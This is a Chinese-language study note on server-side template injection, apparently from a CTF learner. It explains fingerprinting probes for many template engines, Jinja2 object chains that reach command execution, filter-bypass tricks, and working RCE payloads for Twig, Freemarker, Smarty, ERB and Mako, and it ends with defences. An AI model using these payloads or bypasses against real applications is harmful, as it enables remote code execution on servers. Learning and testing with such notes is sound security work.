# SSTI 模板注入 · 原理笔记

> Payload 见 [payload.md](payload.md) ｜ 做题记录见 [做过的题.md](做过的题.md)

## 一句话本质

**用户输入被"当作模板语法"去渲染**，而模板引擎的能力远不止填变量——它能做运算、访问对象属性、调用方法，于是从"显示错字"一路升级到远程命令执行。

区分：**SSTI ≠ XSS**。XSS 是浏览器执行你的脚本；SSTI 是**服务端**把 `{{7*7}}` 当代码算成 `49`。

## 触发点

| 场景 | 说明 |
| --- | --- |
| 用户输入直接拼进模板字符串 | 典型坏代码：`render_template_string("Hello " + name)` |
| 邮件模板 / 通知模板可自定义 | 常见于后台功能 |
| 报错页 / 说明页支持变量占位 | `{{name}}` 形式的"个性化" |
| 前端模板 + 服务端渲染混用 | 需要区分是前端还是后端渲染 |

## 第一步永远是"指纹识别"

提交运算式，**看谁被算出来了**：

| 引擎 | 探测 payload | 现象 |
| --- | --- | --- |
| Jinja2 (Python/Flask) | `{{7*7}}` | `49` |
| Jinja2 与 Twig 的区分 | `{{7*'7'}}` | Jinja2 → `7777777`；Twig → `49` |
| Twig (PHP) | `{{7*7}}` | `49` |
| Java EL / Spring | `${7*7}` | `49` |
| Freemarker (Java) | `${7*7}` | `49` |
| Velocity (Java) | `#set($x=7*7)$x` | `49` |
| Smarty (PHP) | `{$smarty.version}` 或 `{7*7}` | 版本号 / `49` |
| Mako (Python) | `${7*7}` | `49` |
| ERB (Ruby) | `<%= 7*7 %>` | `49` |
| Tornado (Python) | `{{7*7}}` | `49` |
| Django 模板 | `{{7*7}}` | **不运算**（Django 模板故意不支持运算） |
| Handlebars (Node) | `{{7*7}}` | 不运算或报错 |

> 只回显 `{{7*7}}` 原样 = 没有模板渲染；回显空 = 可能被过滤或渲染成空了。
> 拿不准就多打几个不同语法的探测串，一次性定位引擎。

## 从"能运算"到"能执行命令"（Jinja2 为例）

原理链条：字符串 → 类 → 父类 → 所有子类 → 找到能读文件/执行命令的类 → 调用。

```
''          →  str 对象
.__class__  →  <class 'str'>
.__mro__    →  方法解析顺序，向上找基类
.__subclasses__()  →  object 的所有子类（含 os._wrap_close、subprocess.Popen 等）
```

捷径（比 `__subclasses__` 稳，因为列表下标会随环境变）：

```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

**为什么这些能行**：Flask 把 `config`、`lipsum`、`cycler`、`request`、`get_flashed_messages` 等对象注入到了模板全局作用域，而它们的 `__globals__` 里有 `os` 模块。

## 过滤与绕过思路

| 被过滤 | 绕过 |
| --- | --- |
| `.` 点 | `\|attr('__class__')`、`\|attr("__globals__")` |
| `_` 下划线 | 用 `request.args.a` 传参：`{{''[request.args.a]}}&a=__class__` |
| `{{ }}` | 用 `{% print(...) %}` 或 `{% if ... %}` |
| 引号 | `request.args` / `request.values` 传字符串，或用 `chr()` 拼接 |
| `[` `]` | `.__getitem__(0)` |
| 关键字 `os` / `popen` / `system` | 字符串拼接 `'o'+'s'`、`\|attr('po'+'pen')`、Unicode 转义 |
| `config` / `lipsum` 被拉黑 | 换 `cycler`、`joiner`、`namespace`、`request` 等 |
| 长度限制 | 用 `{%set%}` 分段赋值；或用 `request.args` 传整段代码 |

## 其他引擎的经典 RCE 链

| 引擎 | payload |
| --- | --- |
| Twig 1.x | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` |
| Twig 2.x/3.x | `{{['id']\|filter('system')}}` |
| Freemarker | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| Smarty | `{system('id')}`（老版本 `{php}{/php}`） |
| Velocity | `#set($e="e")$e.getClass().forName("java.lang.Runtime")...` |
| ERB | `<%= system('id') %>` |
| Mako | `<%import os%>${os.popen('id').read()}` |

## 防御

| 做法 | 说明 |
| --- | --- |
| 不把用户输入拼进模板 | 治本：模板字符串应当是常量，变量只做数据传入 |
| 禁用 `render_template_string` | Flask 里这个函数的滥用是 SSTI 的头号来源 |
| 沙箱模式 | Jinja2 `SandboxedEnvironment`；但要具体评估已知逃逸链 |
| 输入校验 + 白名单 | 只允许字母数字等安全字符 |
| 最小权限运行 | 即使被打穿，也限制影响面 |
